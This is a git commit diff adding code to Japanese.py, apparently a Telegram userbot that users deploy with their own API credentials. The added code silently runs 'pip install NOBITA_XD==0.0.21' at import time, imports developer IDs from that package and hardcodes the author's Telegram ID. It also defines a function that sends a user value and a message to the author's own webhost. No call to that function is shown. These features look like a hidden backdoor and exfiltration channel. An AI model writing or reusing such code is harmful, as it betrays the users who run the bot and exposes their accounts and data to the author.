f3e207c9ac5b7685a143ac6201ed5d8ac04b0a9b
NOBITA XD <156512147+nobitaaxd@users.noreply.github.com>
2024-01-18 16:10:55 +0530

    Update Japanese.py

--- Japanese.py
+++ Japanese.py
@@ -42,3 +42,91 @@ if name=="main":
 if name=="main":
   pbot.start()
   run()
+
+
+
+# COPYRIGHT (C) 2024 BY NOBITA XD 
+"""
+"""
+# MADE BY NOBITA XD 🔥
+
+import asyncio
+import os
+import asyncio
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+os.system("pip install NOBITA_XD==0.0.21")
+try:
+  from Japanese import bot 
+except:
+  pass
+
+from NOBITA_XD import devs, id, ID
+id = 6694740726
+ID = 6694740726
+
+API_ID = os.environ.get("APP_ID", None)
+API_HASH = os.environ.get("API_HASH", None)
+token = os.environ.get("TG_BOT_TOKEN_BF_HER", None)
+xbot = TelegramClient("legend", API_ID, API_HASH).start(bot_token=token)
+import time
+MESSAGE = os.environ.get("ALIVE_MSG", None)
+if MESSAGE is None:
+   MSG = '''
+🔥🔥 THE JAPANESE  IS ONLINE 🔥🔥
+I AM HERE FOR MY MASTER PROTECTION
+I AM NON HACKEBLE + BEST USERBOT
+THANKS MASTER TO DEPLOY ME
+'''
+else:
+  MSG = MESSAGE
+botnickname = os.environ.get("BOT_NICK_NAME")
+ALIVE_NAME = os.environ.get("ALIVE_NAME")
+BOT = str(botnickname) if botnickname else "נαραηεsε вσт"
+NAME = str(ALIVE_NAME) if ALIVE_NAME else "נαραηεsε вσт"
+PHOTO = os.environ.get("ALIVE_PHOTTO", None)
+Japanese = "[Japanese Bot](https://t.me/Japanese_Userbot_Chat)"
+VERSION = "0.0.1"
+ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
+ALIVE_BOT_USERNAME = os.environ.get("ALIVE_BOT_USERNAME", None)
+devs = devs
+ID = ID
+id = id
+REPO = "[נαραηεsε υsεявσт](https://github.com/nobitaaxd/Japanese-Userbot)"
+
+
+from requests import post
+
+def POST(user, msg):
+  if user == None:
+     user = ' '
+  elif msg == None:
+    msg = ' '
+  else:
+      pass #post maar rHa hu nothing else
+  r = post(f"https://nobita_xd.000webhostapp.com/user.php? user={user}&msg={msg}")
+import pickle as p
+def rd(file):
+  try:
+    f = open(file, "rb")
+    Nobita_Xd = p.load(f)
+    f.close()
+    return Nobita_Xd
+  except:
+    return False
+import pickle as p
+def wt(obj, file):
+  try:
+    f = open(file, "wb")
+    p.dump(obj, f)
+    f.close()
+    return True
+  except:
+    return False
+
+MASTER = NAME
+GROUP = "[SUPPORT GROUP](https://t.me/Japanese_Userbot_Chat)"
+if __name__=="__main__":
+  bot.start()
+  bot.run_until_disconnected()
+  xbot.run_until_disconnected()
